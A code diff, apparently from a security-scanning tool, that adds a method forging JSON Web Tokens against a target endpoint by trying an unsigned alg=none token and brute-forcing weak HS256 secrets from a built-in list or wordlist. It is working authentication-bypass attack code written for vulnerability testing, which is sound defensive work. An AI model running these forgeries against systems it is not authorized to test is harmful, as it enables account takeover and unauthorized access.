@@ -158,3 +158,99 @@ class ActiveFlowTester:
             )
         return FlowResult(success=False, proof_type="non_exploitable", severity="info",
                            evidence={"reason": "no significant diff"})
+
+    async def test_jwt_manipulation(
+        self,
+        token: str,
+        target_endpoint: EndpointSpec,
+    ) -> FlowResult:
+        """Try alg=none + weak-secret brute against `target_endpoint` using `token`.
+
+        Reportable when server accepts a forged token (state-changing access).
+        """
+        import base64 as _b64
+        import json as _json
+        try:
+            import jwt as _jwt
+        except ImportError:
+            return FlowResult(success=False, proof_type="error",
+                               evidence={"error": "PyJWT not installed"}, severity="info")
+        client = getattr(self, "_http_client", None) or httpx.AsyncClient(
+            timeout=15, verify=False,
+        )
+
+        # Parse original token payload (no verify -- exploratory)
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return FlowResult(success=False, proof_type="error",
+                                   evidence={"error": "not a JWT"}, severity="info")
+            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
+            payload = _json.loads(_b64.urlsafe_b64decode(payload_raw))
+        except Exception as exc:
+            return FlowResult(success=False, proof_type="error",
+                               evidence={"error": f"parse failed: {exc}"},
+                               severity="info")
+
+        # Attack 1: alg=none
+        unsigned_header = _b64.urlsafe_b64encode(
+            _json.dumps({"alg": "none", "typ": "JWT"}).encode()
+        ).rstrip(b"=").decode()
+        unsigned_payload = _b64.urlsafe_b64encode(
+            _json.dumps(payload).encode()
+        ).rstrip(b"=").decode()
+        unsigned_token = f"{unsigned_header}.{unsigned_payload}."
+
+        try:
+            resp = await client.request(
+                target_endpoint.method.upper(), target_endpoint.url,
+                headers={"Authorization": f"Bearer {unsigned_token}"},
+            )
+            if 200 <= resp.status_code < 300:
+                return FlowResult(
+                    success=True, proof_type="exploit_success", severity="critical",
+                    evidence={
+                        "endpoint": target_endpoint.url,
+                        "technique": "alg=none",
+                        "forged_token": unsigned_token[:80] + "...",
+                        "response_status": resp.status_code,
+                        "impact": "Server accepts unsigned JWT -- full auth bypass",
+                    },
+                )
+        except httpx.RequestError:
+            pass
+
+        # Attack 2: weak-secret brute (top-N from wordlist if available)
+        weak_secrets = ["secret", "password", "123456", "admin", "key", "jwt"]
+        if self.jwt_wordlist_path:
+            try:
+                from pathlib import Path
+                lines = Path(self.jwt_wordlist_path).read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines()
+                weak_secrets = [ln.strip() for ln in lines[:1000] if ln.strip()]
+            except OSError:
+                pass
+
+        for candidate in weak_secrets:
+            try:
+                forged = _jwt.encode(payload, candidate, algorithm="HS256")
+                resp = await client.request(
+                    target_endpoint.method.upper(), target_endpoint.url,
+                    headers={"Authorization": f"Bearer {forged}"},
+                )
+                if 200 <= resp.status_code < 300:
+                    return FlowResult(
+                        success=True, proof_type="exploit_success", severity="critical",
+                        evidence={
+                            "endpoint": target_endpoint.url,
+                            "technique": f"weak-secret (candidate={candidate})",
+                            "response_status": resp.status_code,
+                            "impact": "JWT signed with guessable secret",
+                        },
+                    )
+            except (httpx.RequestError, Exception):
+                continue
+
+        return FlowResult(success=False, proof_type="non_exploitable", severity="info",
+                           evidence={"reason": "alg=none rejected; no weak secret matched"})
